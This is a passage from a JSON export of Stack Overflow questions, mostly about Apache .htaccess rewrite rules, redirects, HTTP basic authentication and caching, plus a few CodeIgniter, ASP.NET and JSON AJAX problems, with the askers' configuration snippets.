!-d\n    RewriteRule . rewrite.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["php","authentication",".htaccess","http-headers","password-protection"],"answer_count":14,"favorite_count":20,"up_vote_count":62,"down_vote_count":0,"view_count":30367,"score":62,"question_id":449788,"title":"HTTP authentication logout via PHP","body":"<p>What is the <strong>correct</strong> way to log out of HTTP authentication protected folder?</p>\n\n<p>There are workarounds that can achieve this, but they are potentially dangerous because they can be buggy or don't work in certain situations / browsers. That is why I am looking for correct and clean solution.</p>\n"},{"tags":["php","html",".htaccess","authentication","htpasswd"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":12865543,"title":"Password Protecting Web Directories and Files","body":"<p>A user enters my website and arrives at the home page, he/she should always and only be at home page. All other files are scripts that are run by the homepage but the user should never navigate to them. So here's my directory layout:<br>\n<img src=\"http://i.stack.imgur.com/csqNd.png\" alt=\"Directory\"></p>\n\n<p>They will arrive at Front.php and should <strong>always</strong> stay at Front. So I created an htaccess file that has this code:</p>\n\n<pre><code>DirectoryIndex Front.php index.html\nAuthType Basic\nAuthName \"Login\"\nAuthUserFile /disks/*/*/*/.htpasswd\nRequire valid-user\n</code></pre>\n\n<p>Right now, <strong>EVERYTHING</strong> requires authentication. But I want everything <strong>except</strong> Front.php to require authentication. How can I exclude Front.php from the authentication?</p>\n\n<p>Also, will this authentication prevent the scripts from running or does it just prevent the user from navigating <em>TO</em> the file via url?</p>\n"},{"tags":["wordpress",".htaccess","redirect","subdomain","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12862961,"title":"Using .htaccess to redirect subdirectory and contents to subdomain","body":"<p>I want to take some subdirectories I have on a single domain and redirect them to a subdomain that matches the subdirectories name.</p>\n\n<p>Fore example if I have:</p>\n\n<p><a href=\"http://mysite.com/books\" rel=\"nofollow\">http://mysite.com/books</a><br />\n<a href=\"http://mysite.com/games\" rel=\"nofollow\">http://mysite.com/games</a><br />\n<a href=\"http://mysite.com/another\" rel=\"nofollow\">http://mysite.com/another</a></p>\n\n<p>And if each of those subdirectories will have files, folder, etc beneath them:</p>\n\n<p>ex: <a href=\"http://mysite.com/books/fiction/bookname\" rel=\"nofollow\">http://mysite.com/books/fiction/bookname</a></p>\n\n<p>I want to be able to access those items and the items within them like so:</p>\n\n<p><a href=\"http://books.mysite.com\" rel=\"nofollow\">http://books.mysite.com</a><br />\n<a href=\"http://books.mysite.com/fiction/bookname\" rel=\"nofollow\">http://books.mysite.com/fiction/bookname</a></p>\n\n<p>Same for any other items I may define like:</p>\n\n<p><a href=\"http://games.mysite.com\" rel=\"nofollow\">http://games.mysite.com</a><br />\n<a href=\"http://whatever.mysite.com/afolder/more/content\" rel=\"nofollow\">http://whatever.mysite.com/afolder/more/content</a></p>\n\n<p>I believe I can do this with .htaccess but I'm not entirely sure on the correct code or how to have it cover all the items within the folder. I could figure out how to do each individual item manually, but that wouldn't be helpful since I'd have to do it for hundreds of urls.</p>\n\n<p><strong>EDIT</strong>: <em>To expand more on my setup and goal</em> - </p>\n\n<p>I tried the answer of directing the domain to point to the subdirectory when setting up the domain, but it doesn't work.</p>\n\n<p>Here is more info on how my site is setup. On the main domain is WordPress set up as a WordPress MU install. I KNOW that I can set this up using subdomains with a wildcard entry to my DNS to save myself this headache, BUT my host doesn't allow it and would require me to buy a private server, which I'm not interested in right now since this is more of a test/personal project than anything else and wouldn't garner enough attention/traffic. </p>\n\n<p>So, I've set up WordPressMU to create subdirectories for each of the new sites I add. Right now I have 5 total. The main site (which will be for presenting updates from the four other subsites), and then four subject specific sites. I want the sites to be able to be accessed and browsed by their subdomain, and not the subdirectories. So I really think .htaccess is the route I would have to take since I can't set up my subdomain to point to a directory that doesn't really exist.</p>\n\n<p>PS Thanks in advance for any/all help and suggestions. It is really appreciated.</p>\n"},{"tags":["asp.net",".htaccess","url-rewriting","url-routing","image-replacement"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12865669,"title":"images requests go to the wrong folder need to reroute","body":"<p>Hello I know there are similar questions to this one but i have a little bit different of a spin on the information I need. What I have is an xml file that cannot be edited because of certains rights and validations on the file. We are transforming this xml file with a xsl stylesheet and the transformation occurs using asp .net. I have attached the code below but my problem is the xml file has relative links to images hardcoded inside of it. But with the index.aspx page doing the transformation and delivering to the device accessing it the images files are not linked properly because it tries to find them from the site root folder. To deal with this i have seen there is url rewriting, url redirecting, .htaccess, and several ways but I would like to know what is the \"best\" (least invasive and process consuming) to implement and also if you have a good tutorial site to check out for it.</p>\n\n<pre><code>&lt;%@ Page Language=\"C#\" AutoEventWireup=\"true\" CodeFile=\"index.aspx.cs\" Inherits=\"index\" %&gt;\n\n&lt;%\n    string doc = Request.QueryString[\"doc\"];\n    if (!string.IsNullOrWhiteSpace(doc)) {\n        string docSource = \"xml/\" + doc + \"/\" + doc + \".xml\";\n        if (System.IO.File.Exists(Server.MapPath(docSource))) {\n            this.xmlProcessor.DocumentSource = docSource;\n%&gt;\n            &lt;asp:Xml ID=\"xmlProcessor\" runat=\"server\" DocumentSource=\"\" TransformSource=\"documentTransformation.xsl\"&gt;&lt;/asp:Xml&gt;\n&lt;%\n        } else {\n%&gt; \n            &lt;html&gt;\n                File DNE\n            &lt;/html&gt;          \n&lt;%       \n        }\n    } else {\n%&gt;\n            &lt;html&gt;\n                Nothing selected\n            &lt;/html&gt;\n&lt;%\n    }\n\n%&gt;\n</code></pre>\n\n<p>So basically the links in the page generated in the page here are linking to mydomain.com/*.jpg but i need them redirected to mydomain.com/xml/doc/images/*.jpg</p>\n\n<p>What is my best option to do here? I am new to the asp .net framework but have worked with other languages and frameworks.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12864366,"title":".htaccess rule redirect all pages except a few provided ones","body":"<p>I have the following .htaccess file.</p>\n\n<pre><code>ErrorDocument 404 /404.php\n\n\nRewriteRule ^aanbiedinginformatie$ aanbiedinginformatie.php\nRewriteRule ^algemenevoorwaarden$ algemenevoorwaarden.php\n\nRewriteRule ^contact$ contact.php\nRewriteRule ^disclaimer$ disclaimer.php\nRewriteRule ^faq$ faq.php\nRewriteRule ^index$ index.php\nRewriteRule ^informatie$ informatie.php\nRewriteRule ^inloggen-bedrijven$ inloggen-bedrijven.php\nRewriteRule ^inloggen-consument$ inloggen-consument.php\nRewriteRule ^nieuws$ nieuws.php\nRewriteRule ^(.*)-nieuws$ bekijknieuws.php?id=$1\nRewriteRule ^(.*)-(.*)-persbericht$ persbericht.php?id=$1&amp;bedrijf=$2\nRewriteRule ^persberichteninformatie$ persberichteninformatie.php\nRewriteRule ^privacy$ privacy.php\nRewriteRule ^registreren-bedrijven$ registreren-bedrijven.php\nRewriteRule ^registreren-bedrijven-stap-2$ registreren-bedrijven-stap-2.php\nRewriteRule ^registreren-bedrijven-stap-3$ registreren-bedrijven-stap-3.php\nRewriteRule ^registreren-bedrijven-stap-4$ registreren-bedrijven-stap-4.php\nRewriteRule ^registreren-bedrijven-stap-5$ registreren-bedrijven-stap-5.php\nRewriteRule ^registreren-consument$ registreren-consument.php\nRewriteRule ^vacatureinformatie$ vacatureinformatie.php\nRewriteRule ^(.*)-vacatures$ vacatures.php?id=$1\n\nRewriteRule ^zoeken-op-(.*)$ zoeken.php?query=$1\nRewriteRule ^zoeken-in-(.*)$ zoeken.php?plaats=$1\nRewriteRule ^zoeken-q-(.*)-in-(.*)$ zoeken.php?query=$1&amp;plaats=$2\n\nRewriteRule ^(.*)-vacatures-zoeken$ zoekenvac.php?query=$1\nRewriteRule ^(.*)-in-(.*)-vacatures$ zoekenvac.php?query=$1&amp;plaats=$2\nRewriteRule ^vacatures-in-(.*)$ zoekenvac.php?plaats=$1 \n\nRewriteRule ^(.*)-aanbiedingen$ zoekenaan.php?query=$1\nRewriteRule ^(.*)-aanbiedingen-in-(.*)$ zoekenaan.php?query=$1&amp;plaats=$2\nRewriteRule ^aanbiedingen-in-(.*)$ zoekenaan.php?plaats=$1\n\nRewriteRule ^(.*)-persberichten$ zoekenpers.php?query=$1\nRewriteRule ^persberichten-in-(.*)$ zoekenpers.php?plaats=$1\nRewriteRule ^(.*)-persberichten-in-(.*)$ zoekenpers.php?query=$1&amp;plaats=$2\n\nRewriteRule ^bedrijven-in-(.*)$ zoeken.php?plaats=$1\n\nRewriteRule ^control/consument$ control/consument.php\nRewriteRule ^control/consument-mijngegevens$ control/consument-mijngegevens.php\nRewriteRule ^control/consument-wachtwoord$ control/consument-wachtwoord.php\nRewriteRule ^control/consument-cv$ control/consument-cv.php\nRewriteRule ^control/consument-reacties$ control/consument-reacties.php\nRewriteRule ^control/consument-reviews$ control/consument-reviews.php\nRewriteRule ^control/logout$ control/logout.php\n\nRewriteRule ^control/bedrijven$ control/bedrijven.php\nRewriteRule ^control/bedrijven-aanbieding$ control/bedrijven-aanbieding.php\nRewriteRule ^control/bedrijven-facturen$ control/bedrijven-facturen.php\nRewriteRule ^control/bedrijven-fotos$ control/bedrijven-fotos.php\nRewriteRule ^control/bedrijven-kortingscode$ control/bedrijven-kortingscode.php\nRewriteRule ^control/bedrijven-kortingscode-bewerken-(.*)$ control/bedrijven-    kortingscode-bewerken.php?id=$1\nRewriteRule ^control/bedrijven-kortingscode-verwijderen-(.*)$ control/bedrijven-    kortingscode-verwijderen.php?id=$1\nRewriteRule ^control/bedrijven-wachtwoord$ control/bedrijven-wachtwoord.php\nRewriteRule ^control/bedrijven-pakket$ control/bedrijven-pakket.php\nRewriteRule ^control/bedrijven-persbericht$ control/bedrijven-persbericht.php\nRewriteRule ^control/bedrijven-persbericht-bewerken-(.*)$ control/bedrijven-   persbericht-bewerken.php?id=$1\nRewriteRule ^control/bedrijven-persbericht-verwijderen-(.*)$ control/bedrijven- persbericht-verwijderen.php?id=$1\nRewriteRule ^control/bedrijven-profiel$ control/bedrijven-profiel.php\nRewriteRule ^control/bedrijven-vacatures$ control/bedrijven-vacatures.php\nRewriteRule ^control/bedrijven-vacatures-bekijk-(.*)$ control/bedrijven-vacatures- bekijk.php?id=$1\nRewriteRule ^control/bedrijven-vacatures-bewerken-(.*)$ control/bedrijven-vacatures-   bewerken.php?id=$1\nRewriteRule ^control/bedrijven-vacatures-verwijderen-(.*)$ control/bedrijven-vacatures-verwijderen.php?id=$1\nRewriteRule ^control/logoutb$ control/logoutb.php\n\nRewriteRule ^(.*)$ bedrijf.php?q=$1 [L]\n\nRewriteRule ^id(.*)-(.*)$ bedrijf.php?id=$1\nRewriteRule ^branche(.*)-(.*)$ zoekenbranche.php?id=$1\n</code></pre>\n\n<p>What I want, is that all URL's except the one provided above will redirect to <code>bedrijf.php?q=$1</code>. I tried excluding but that doesn't work.</p>\n\n<p>So www.site.com/companyname will redirect to bedrijf.php?q=companyname, while www.site.com/contact will redirect to contact.php</p>\n\n<p>How would I do this?</p>\n"},{"tags":["apache",".htaccess","url","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12862359,"title":"how to remove dot in an url using htaccess","body":"<p>Certain urls in my site gives 403 - access forbidden error. After doing several hours of research, i found that there is \".\" (dot) in my url causing the 403 error.  I want to replace all dots to hyphen using .htaccess</p>\n\n<p>for e.g.\ni want to change the following url from </p>\n\n<p><a href=\"http://www.example.com/real-listings/0Bedrooms/commercial-land/TN/For-Sale/SELLING-FIVE-ACRE-LAND./Property.html\" rel=\"nofollow\">http://www.example.com/real-listings/0Bedrooms/commercial-land/TN/For-Sale/SELLING-FIVE-ACRE-LAND./Property.html</a></p>\n\n<p>TO</p>\n\n<p><a href=\"http://www.example.com/real-listings/0Bedrooms/commercial-land/TN/For-Sale/SELLING-FIVE-ACRE-LAND/Property.html\" rel=\"nofollow\">http://www.example.com/real-listings/0Bedrooms/commercial-land/TN/For-Sale/SELLING-FIVE-ACRE-LAND/Property.html</a></p>\n\n<p>Please advise and your help appreciated.</p>\n\n<p>regards,</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":48,"score":3,"question_id":12862809,"title":"mod-rewrite remove folder name from url","body":"<p>I am using <a href=\"http://pkp.sfu.ca/?q=ojs\" rel=\"nofollow\">OJS</a> and I have installed it inside a folder called \"journals\". I have created some journals there (for example \"journal1\", \"journal2\", etc).</p>\n\n<p>Now I am getting paths like this: <code>www.example.com/journals/index.php/journal1</code>,\n<code>www.example.com/journals/index.php/journal2</code>, etc.</p>\n\n<p>What I want is to map <code>www.example.com/journals/index.php/journal1</code>\nto looks like <code>www.example.com/index.php/journal1</code> (removing the journal part from URL).</p>\n\n<p>I can't move OJS to root because I have some other files there.</p>\n\n<p>Here is the <code>.htaccess</code> file which I am using currently (it's in \"journals\" folder and giving me a 500)</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\nRewriteCond $1 !^journals\nRewriteRule ^(.*) /journals/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Also Here is the error.log</p>\n\n<pre><code>[Fri Oct 12 22:16:45 2012] [error] [client 127.0.0.1] Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace. \n</code></pre>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12863667,"title":"url rewrite and 404 error page not found","body":"<p>I am using url rewrite like this</p>\n\n<pre><code>RewriteRule ^help$ help.php\n</code></pre>\n\n<p>so if user come with domain.com/help it work\nbut if user call page like domain.com/help/ it send err 404 page not found\nhow can fix this that in 2 case it do same job</p>\n"},{"tags":[".htaccess","virtualhost"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12857032,"title":"virtualhost for subdomain using .htaccess file","body":"<p>I have uploaded source code of my product on the site . </p>\n\n<p>My site name is for eg:- testcoder.com</p>\n\n<p>now...the thing is i have many clients to whom i wanted to provide service but they want there domain needs to be</p>\n\n<p>client1.testcoder.com\nclient2.testcoder.com</p>\n\n<p>i have created a subdomain as well\nbut the basic thing is code is same for all the clients so what i did is i kept my code\nunder</p>\n\n<p>code.testcoder.com</p>\n\n<p>Now i want .htaccess virtual host in such a way that even the client uses</p>\n\n<p>\"client1.testcoder.com\" browser needs to server the code from \"code.testcoder.com\"\nand in the same way \"client1.testcoder.com/test1.php\" needs to be \"code.testcoder.com/test1.php\"....</p>\n\n<p>i wanted to do it from .htaccess only as i am using shared hosting....</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["php",".htaccess","redirect","front-controller"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2370,"score":0,"question_id":7060932,"title":"Apache .htaccess: redirect all request to a file, except images?","body":"<p>Im using this .htaccess now:</p>\n\n<p><code>Options +FollowSymLinks +ExecCGI</code></p>\n\n<p><code>&lt;IfModule mod_rewrite.c&gt;</code></p>\n\n<p><code>RewriteEngine On</code></p>\n\n<p><code>RewriteRule ^(.*)$ entryPoint.php [QSA]</code></p>\n\n<p><code>&lt;/IfModule&gt;</code></p>\n\n<p>with this, I want <em>all</em> request to be redirected to entryPoint.php so that it can examine them: if there is no extension, is must be a module, if there's a .php, it's a hacking, if it's a .png, then it's a \"safe\" call.\nIn case of images, I used to output headers, and file_get_contents() their content. I figured out it's a bit slowlier than leaving just direct readed. How to set for this .htaccess not to call entryPoint.php if there are references for images? Is this file looks OK already at all?</p>\n"},{"tags":["php",".htaccess","url","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":49,"score":3,"question_id":12860695,"title":".htaccess multi URL rewriting","body":"<p>I have this rule:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ profil.php?upime=$1\n</code></pre>\n\n<p>and it is working. Now I want to know how to rewrite the URL of another page:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ profil.php?upime=$1\nRewriteRule ^(.*)$ novica.php?nid=$2 - I did this, but is not working.\n</code></pre>\n\n<p>what can I do that I will have both rules in one <code>.htaccess</code> file?</p>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12859819,"title":"url rewrite `/abc/products-` to `/def/products-`","body":"<p>I have many url links in <code>/abc/</code> sub-directory, like</p>\n\n<pre><code>http://www.domain.com/abc/products-12345\nhttp://www.domain.com/abc/products-23456\nhttp://www.domain.com/abc/products-34567\nhttp://www.domain.com/abc/new-items\n</code></pre>\n\n<p>Now I want to <code>url rewrite</code> <code>/abc/products-</code>  to <code>/def/products-</code></p>\n\n<pre><code>http://www.domain.com/def/products-12345\nhttp://www.domain.com/def/products-23456\nhttp://www.domain.com/def/products-34567\nhttp://www.domain.com/abc/new-items\n</code></pre>\n\n<p>My code in <code>.htaccess</code>, but nothing changed. How to rewrite in this case? Thanks.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^abc/products-(.*)$ /def/products-$1 [L,R=301]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","caching","https","firebug","browser-cache"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":193,"score":1,"question_id":12688430,"title":"Caching not working in HTTPS","body":"<p>I had previously asked this question and mistakenly thought my problem didn't really exist (see: <a href=\"http://stackoverflow.com/questions/12566852/caching-and-https\">Caching and HTTPS</a>). I was wrong; the problem does exist.</p>\n\n<p>Here's the description of my problem:</p>\n\n<ol>\n<li>When I load a resource (say, <strong>resource-a</strong>) from an HTTP page (all resources will come from HTTP when on an HTTP page), I get a <code>200 OK</code>. When I reload the page (or go to another HTTP page), resource-a gets a <code>304 Not Modified</code>.</li>\n<li>When I load resource-a from an HTTPS page (all resources will from from HTTPS when on an HTTPS page), resource-a is loaded from HTTPS and get a <code>200 OK</code>. And when I reload the page (or go to another HTTPS page), I get a <code>304 Not Modified</code>.</li>\n<li>When I return to an HTTP page, resource-a still gets a <code>304 Not Modified</code>.</li>\n<li>When I return to an HTTPS page, resource-a gets a <code>200 OK</code>. <strong>What happened to the cached copy? How can I make it cached?</strong></li>\n</ol>\n\n<p>Here's an example for the headers:</p>\n\n<pre><code>Request URL: https://styles.mydomain.com/assets/styles/main.css\nRequest Method: GET\nStatus Code: 200 OK\n\nRequest Headers\nAccept: text/css,*/*;q=0.1\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\nAccept-Encoding: gzip,deflate,sdch\nAccept-Language: en-US,en;q=0.8\nConnection: keep-alive\nHost: styles.mydomain.com\nReferer: https://www.mydomain.com/sign-in/\nUser-Agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4\n\nResponse Header\nAccept-Ranges: bytes\nCache-Control: public\nConnection: Keep-Alive\nContent-Encoding: gzip\nContent-Length: 11836\nContent-Type: text/css\nDate: Tue, 02 Oct 2012 09:51:20 GMT\nExpires: Fri, 30 Sep 2022 09:51:20 GMT\nKeep-Alive: timeout=5, max=99\nLast-Modified: Tue, 02 Oct 2012 09:25:30 GMT\nServer: Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/0.9.7a mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 PHP/5.3.8\nVary: Accept-Encoding\n</code></pre>\n"},{"tags":[".htaccess","codeigniter-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2016,"score":0,"question_id":5524648,"title":"Codeigniter .htaccess","body":"<p>Sorry for my bad english...</p>\n\n<p>I have the most basic possible CodeIgniter setup and can't make it work... if i access the url\n<a href=\"http://domain.com/index.php?controllerX/method\" rel=\"nofollow\">http://domain.com/index.php?controllerX/method</a>  it works fine.</p>\n\n<p>Now I want to be able to access\n<a href=\"http://domain.com/method\" rel=\"nofollow\">http://domain.com/method</a></p>\n\n<p>I configured on routes.php \"controllerX\" to be the default controller and try to use the follow .htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>I have tried multiple .htaccess and everytime the server just returns 403 errors. Even if my .htaccess contains only the first line \"RewriteEngine on\", it shows 403 errors. I have tried to set every folder to chmod 777 or 755 to test and this change nothing.</p>\n\n<p>Is there a way to see what resource are giving the 403 error? Or am I comiting a mistake elsewhere?</p>\n\n<p>Ok, i readed somewhere that I need \"Options +FollowSymLink\" on my htaccess ... with that the server show me 500 errors :(</p>\n\n<p><strong>EDIT</strong>\nOk, now its working, with the follow htaccess:</p>\n\n<pre><code>Options +FollowSymLinks\nOptions +Indexes\nRewriteEngine On\nRewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteCond $1 !^(index\\.php)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":11828630,"title":"how to htaccess redirect *.html/ to *.html","body":"<p>Can someone help me add the right line to htaccess that will redirect URLs that end with .html/</p>\n\n<p>to </p>\n\n<p>.html</p>\n\n<p>For example, <a href=\"http://mysite.com/page.html/\" rel=\"nofollow\">http://mysite.com/page.html/</a> should 301 redirect to <a href=\"http://mysite.com/page.html\" rel=\"nofollow\">http://mysite.com/page.html</a></p>\n"},{"tags":[".htaccess","google","redirect","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12855357,"title":".htaccess redirects - updated site (301 appropriate?)","body":"<p>I've run into a problem updating my site, the google search results show up links to the old page which are 404's now, some of them even containing deprecated content.</p>\n\n<p>My question is about the use of 301's. The old page had deeply nested pages like the example below:</p>\n\n<pre><code>    www.site.com/category/subjects/subject_b.html\n</code></pre>\n\n<p>It shows up in google with a very specific description of 'subject_b', which is not optimal for my purposes.</p>\n\n<p>The new layout I've been working on means that content that was once under '/category/subjects/subject_b' is now found in a single page (www.site.com/subjects.html), along with the hypothetical subject_a &amp; subject_c.</p>\n\n<p>Would I be wrong redirecting the old pages like this?</p>\n\n<pre><code>    redirect http://www.site.com/category/subjects/subject_a.html http://www.site.com/subjects.html\n    redirect http://www.site.com/category/subjects/subject_b.html http://www.site.com/subjects.html\n    redirect http://www.site.com/category/subjects/subject_c.html http://www.site.com/subjects.html\n</code></pre>\n\n<p>Also, how would I deal with pages that have google descriptions with content which is not on the new equavilient page?</p>\n\n<p>I'd be happy if anyone could shed some light on this for me, or point me in a right direction as to where I can read more about it!</p>\n"},{"tags":[".htaccess","url-rewriting","directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12854889,"title":"htaccess to add directory after domain name?","body":"<p>How can I use htaccess to always ADD a directory immediately after the domain name?</p>\n\n<p>So for example, change requests for\n<code>http://domain.com/path-to/file.php</code>\nto\n<code>http://domain.com/added-directory/path-to/file.php</code></p>\n\n<p>The context here is that i am migrating a site to a new server, and the domain name is not yet pointed to the new server. But the hosting company provides me with a \"temporary url\" based on the Shared IP and my account username, so <code>http://216.172.172.211/~myusername/</code> , but all the paths in all the html are doc-root relative, like /images/logo.png, which translates to <code>http://216.172.172.211/images/logo.png</code> which is wrong. I need it to be <code>http://216.172.172.211/~myusername/images/logo.png</code> .</p>\n"},{"tags":[".htaccess","url","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12854217,"title":"htacess static url rewrite","body":"<p>I am working on wordpress blog and the its has the url pattern something like this. <strong>localhost/blog/2012/10/12/sample-post/</strong> .</p>\n\n<p>Now i have updated the url pattern to <strong>localhost/blog/sample-post/</strong>.</p>\n\n<p>Now i need a redirection to second URL pattern if someone enters the first URL Pattern as i have already submitted URLs with first pattern to couple of articles.</p>\n\n<p>i.e, <strong>localhost/blog/2012/10/12/sample-post/</strong> should be redirected to  <strong>localhost/blog/sample-post/</strong></p>\n\n<p>Can anyone assist me by providing htacess code ?</p>\n\n<p>-\nThanks\nSyam</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12852183,"title":".htaccess better rewritting solution ? why apache/nginx takes long time repsonse","body":"<p>After i added following rewriting code to the my website, i noticed that sever requests are taking a longtime, (i dont have any page html errors, js errors, or anything in my web site pages)</p>\n\n<p>But i noticed that in firefox \"loading\" is keep on showing the page is still requesting and it takes a long time (1 min) to stop it. </p>\n\n<p>I presume this rewriting code is creating this delay... any ideas on how to improve this ?</p>\n\n<pre><code># BEGIN Rewrite\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on \nRewriteBase /\nRewriteCond %{HTTP_HOST} ^career.com\nRewriteRule (.*) http://www.career.com/$1 [R=301,L]\nRewriteRule ^files/([^/]+)/seeker/cover/([^/]+)$ uploads/seeker/cover/$2  [QSA,L]\nRewriteRule ^files/([^/]+)/seeker/cv/([^/]+)$ uploads/seeker/cv/$2  [QSA,L]\nRewriteRule ^files/([^/]+)/account/([^/]+)$ uploads/account/$2  [QSA,L]\nRewriteRule ^files/([^/]+)/employer/logo/([^/]+)$ uploads/employer/logo/$2  [QSA,L]\nRewriteRule ^jobs/([^/]+)/?(.*)$ jobs.php?job_id=$1  [QSA,L]\nRewriteRule ^industry/([^/]+)/?(.*)$ results.php?formID=industryBrowse&amp;industry_id=$1  [QSA,L]\nRewriteRule ^company/([^/]+)/?(.*)$ results.php?formID=employerBrowse&amp;employer_id=$1 [QSA,L]\nRewriteRule ^profile/employer/([^/]+)/?(.*)$ company.php?employer_id=$1 [QSA,L]\n&lt;/IfModule&gt;\n# END Rewrite\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12852962,"title":"Mod Rewrite is giving me a hard time","body":"<p>I'm currently using wamp on windows 7. I'd like to clean my urls obviously. I've tried to find the current syntax and what not, but I haven't figured it out.</p>\n\n<p>My path right now is localhost/rs/index.php<br>\nWhen I go to localhost/rs/user it gives me a 404, but localhost/rs/ gives me the index.php page.</p>\n\n<p>This is what I have in my .htaccess file at the www directory of wamp.</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^/$ index.php\nRewriteRule ^/([a-z]+)$ index.php?page=$1\nRewriteRule ^/([a-z]+)/$ index.php?page=$1\n</code></pre>\n\n<p>I have un-commented the line </p>\n\n<pre><code>LoadModule rewrite_module modules/mod_rewrite.so\n</code></pre>\n\n<p>in the httpd.conf file of Apache</p>\n\n<p>What's wrong? Is my .htaccess file in the wrong spot? Is my syntax wrong?</p>\n\n<p>Thanks!</p>\n"},{"tags":["php",".htaccess","configuration-files"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":61,"score":-2,"question_id":12838825,"title":"How to hide/remove Query String in php using htaccess?","body":"<p>Eg :\n<a href=\"https://int.theqtl.com/test/t1.php?id=2\" rel=\"nofollow\">https://int.theqtl.com/test/t1.php?id=2</a>\nchange to</p>\n\n<p><a href=\"https://int.theqtl.com/test/t1.php\" rel=\"nofollow\">https://int.theqtl.com/test/t1.php</a></p>\n"},{"tags":[".htaccess","redirect","subdomain"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":872,"score":1,"question_id":5692886,"title":"redirect all to another url except specific folder(s) and subdomain(s)","body":"<p>presently I have my htaccess redirecting everything to another URL, unless it is in the forums folder...</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI} !/Forum\nRewriteRule ^.*$ http://www.newsite.com/ [R=301]\n</code></pre>\n\n<p>I have set up a sub-domain in my original site, using a folder called subdomain.</p>\n\n<p>what I would like to do is retain my existing redirect, and prevent redirects of my subdomain</p>\n"},{"tags":["php","json",".htaccess","http-headers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":11645844,"title":"406 Not Acceptable error on live server - JSON","body":"<p>I've just moved a site to live and am getting a 406 Not Acceptable error when using jquery to make an ajax request to a php script. I don't get the error on my test server so I'm just trying to figure out the correct way to fix this. The AJAX request is as follows, and expects JSON response, while my php script is just echoing out with <code>json_encode()</code>. </p>\n\n<pre><code>$.ajax({\n        type: \"POST\",\n        contentType: \"application/json\",\n        data: \"{}\",\n        url: \"server/php/progress.php\",\n        dataType: \"json\",\n</code></pre>\n\n<p>EDIT: here's the crux of my php script (have also tried without the header setting):</p>\n\n<pre><code>header('Content-type: application/json');\necho json_encode($val);\nexit;\n</code></pre>\n\n<p>Any thoughts on what should be done to fix this? htaccess 